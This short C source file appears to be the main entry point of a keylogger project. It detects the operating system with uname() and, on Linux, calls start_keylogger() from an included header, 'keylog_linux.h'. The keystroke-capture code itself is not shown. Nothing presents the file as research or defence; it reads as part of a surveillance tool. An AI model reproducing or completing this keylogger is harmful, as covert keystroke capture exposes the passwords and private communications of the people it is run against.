#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

#include "keylog_linux.h"

struct utsname uname_ptr;

int main() {
	uname(&uname_ptr);

	if (strcmp(uname_ptr.sysname, "Linux") == 0) {
		printf("System is linux\n");
		start_keylogger();
	} else if (strcmp(uname_ptr.sysname, "Windows") == 0) {
		printf("System is windows\n");
	}
	
	return 0;
}
